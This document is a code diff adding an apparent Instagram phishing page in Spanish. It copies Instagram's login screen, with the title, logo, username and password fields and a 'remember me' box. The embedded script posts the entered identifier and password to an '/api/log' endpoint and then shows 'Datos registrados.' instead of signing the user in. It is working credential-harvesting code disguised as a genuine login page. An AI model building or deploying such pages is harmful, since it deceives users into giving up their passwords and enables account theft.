@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <button class="close-btn">&times;</button>
+        
+        <div class="login-box">
+            <img src="Instagram_logo.svg" alt="Instagram" class="logo">
+           
+            
+            <form class="login-form" id="loginForm">
+                <input 
+                    type="text" 
+                    id="identifier"
+                    placeholder="Teléfono, usuario o correo electrónico" 
+                    class="input-field"
+                    required
+                >
+
+                <input 
+                    type="password" 
+                    id="password"
+                    placeholder="Contraseña" 
+                    class="input-field"
+                    required
+                >
+
+                <div class="checkbox-container">
+                    <input type="checkbox" id="remember" class="checkbox">
+                    <label for="remember">Guardar datos de inicio de sesión</label>
+                </div>
+
+                <button type="submit" class="login-btn">Entrar</button>
+
+                <a href="#" class="forgot-password">¿Has olvidado la contraseña?</a>
+            </form>
+
+            <div id="message" class="message"></div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const identifier = document.getElementById('identifier').value;
+            const password = document.getElementById('password').value;
+            const remember = document.getElementById('remember').checked;
+            const messageDiv = document.getElementById('message');
+            
+            try {
+                const response = await fetch('/api/log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ identifier, password, remember })
+                });
+                
+                if (response.ok) {
+                    messageDiv.textContent = 'Datos registrados.';
+                    messageDiv.classList.add('success');
+                    document.getElementById('loginForm').reset();
+                } else {
+                    messageDiv.textContent = 'Error al registrar.';
+                    messageDiv.classList.add('error');
+                }
+            } catch (error) {
+                messageDiv.textContent = 'Error: ' + error.message;
+                messageDiv.classList.add('error');
+            }
+        });
+    </script>
+</body>
+</html>
